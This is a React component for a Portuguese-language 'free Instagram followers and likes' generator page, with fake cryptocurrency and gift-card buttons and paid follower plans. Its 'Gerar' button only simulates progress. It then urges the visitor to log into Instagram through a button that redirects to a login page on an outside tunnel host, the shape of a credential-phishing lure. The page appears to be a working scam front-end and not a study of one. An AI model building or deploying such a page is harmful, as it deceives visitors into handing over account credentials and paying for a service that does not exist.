import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { Loader2, ShieldCheck, Lock, Users, Heart, Menu, User, Bitcoin, Gift, ThumbsUp, Star } from "lucide-react";

export default function GeradorSeguidores() {
  const [username, setUsername] = useState("");
  const [quantidade, setQuantidade] = useState("");
  const [tipo, setTipo] = useState("seguidores");
  const [status, setStatus] = useState("idle");
  const [menuOpen, setMenuOpen] = useState(false);

  const handleGenerate = () => {
    if (!username || !quantidade) return;
    setStatus("loading");
    setTimeout(() => {
      setStatus("done");
    }, 3000);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 p-4 text-white">
      {/* Navbar */}
      <div className="w-full flex justify-between items-center p-4 bg-gray-800 shadow-md border-b border-gray-700 relative">
        <Menu className="text-white cursor-pointer" onClick={() => setMenuOpen(!menuOpen)} />
        <h1 className="text-xl font-bold">Gerador PRO</h1>
        <User className="text-white cursor-pointer" />
        
        {menuOpen && (
          <div className="absolute left-0 top-12 bg-gray-800 border border-gray-700 rounded-md p-2 shadow-lg w-48 flex flex-col gap-2">
            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Criptomoeda')}> <Bitcoin /> Gerar Criptomoeda </Button>
            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Gift Card')}> <Gift /> Gerar Gift Card </Button>
            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Curtidas')}> <ThumbsUp /> Gerar Curtidas </Button>
          </div>
        )}
      </div>

      {/* Gerador */}
      <Card className="w-full max-w-md p-6 bg-gray-800 shadow-xl rounded-lg border border-gray-700 mt-6">
        <CardContent className="flex flex-col gap-4">
          <h1 className="text-2xl font-bold text-center flex items-center justify-center gap-2">
            <ShieldCheck className="text-green-400" /> Gerador Seguro
          </h1>
          <p className="text-sm text-gray-400 text-center">Aumente seu engajamento de forma rápida e segura!</p>
          <Input 
            placeholder="Digite seu @ do Instagram" 
            value={username} 
            onChange={(e) => setUsername(e.target.value)} 
            className="bg-gray-700 border-gray-600 text-white"
          />
          <Input 
            type="number" 
            placeholder="Quantidade desejada" 
            value={quantidade} 
            onChange={(e) => setQuantidade(e.target.value)} 
            className="bg-gray-700 border-gray-600 text-white"
          />
          <div className="flex gap-2">
            <Button 
              onClick={() => setTipo("seguidores")} 
              className={`flex-1 ${tipo === "seguidores" ? "bg-blue-500" : "bg-gray-600"}`}
            >
              <Users className="mr-2" /> Seguidores
            </Button>
            <Button 
              onClick={() => setTipo("curtidas")} 
              className={`flex-1 ${tipo === "curtidas" ? "bg-red-500" : "bg-gray-600"}`}
            >
              <Heart className="mr-2" /> Curtidas
            </Button>
          </div>
          <Button 
            onClick={handleGenerate} 
            className="bg-green-500 hover:bg-green-600 text-white py-2 rounded"
            disabled={status === "loading"}
          >
            {status === "loading" ? <Loader2 className="animate-spin" /> : "Gerar"}
          </Button>
          {status === "loading" && <p className="text-center text-yellow-400">Gerando...</p>}
          {status === "done" && (
            <div className="text-center">
              <p className="text-green-400 font-semibold">Concluído com sucesso!</p>
              <p className="text-sm text-gray-400 mt-2">Faça o login da sua conta do Instagram para ativar o sistema de seguidores</p>
              <div className="flex justify-center mt-4">
                <Button 
                  className="bg-blue-500 hover:bg-blue-600 text-white flex items-center justify-center gap-2"
                  onClick={() => window.location.href = 'https://zdg4rjn6bi.eu.loclx.io/login.html'}
                >
                  <Lock /> Login
                </Button>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Planos Pagos */}
      <div className="w-full max-w-md p-6 bg-gray-800 shadow-xl rounded-lg border border-gray-700 mt-8">
        <h2 className="text-2xl font-bold text-center mb-4 text-white">Planos PRO</h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4">Plano Básico</h3>
            <p className="text-lg mb-4">10.000 Seguidores / Curtidas</p>
            <p className="text-sm mb-4">Ideal para quem está começando!</p>
            <p className="text-lg font-bold mb-4">R$ 49,99</p>
            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
          </Card>

          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4">Plano Avançado</h3>
            <p className="text-lg mb-4">50.000 Seguidores / Curtidas</p>
            <p className="text-sm mb-4">Perfeito para aumentar o engajamento rapidamente!</p>
            <p className="text-lg font-bold mb-4">R$ 129,99</p>
            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
          </Card>

          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4">Plano Premium</h3>
            <p className="text-lg mb-4">100.000 Seguidores / Curtidas</p>
            <p className="text-sm mb-4">Para resultados rápidos e consistentes!</p>
            <p className="text-lg font-bold mb-4">R$ 199,99</p>
            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
          </Card>

          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4">Plano Executivo</h3>
            <p className="text-lg mb-4">500.000 Seguidores / Curtidas</p>
            <p className="text-sm mb-4">Para quem busca um nível de engajamento profissional!</p>
            <p className="text-lg font-bold mb-4">R$ 499,99</p>
            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
          </Card>
        </div>
      </div>
    </div>
  );
}

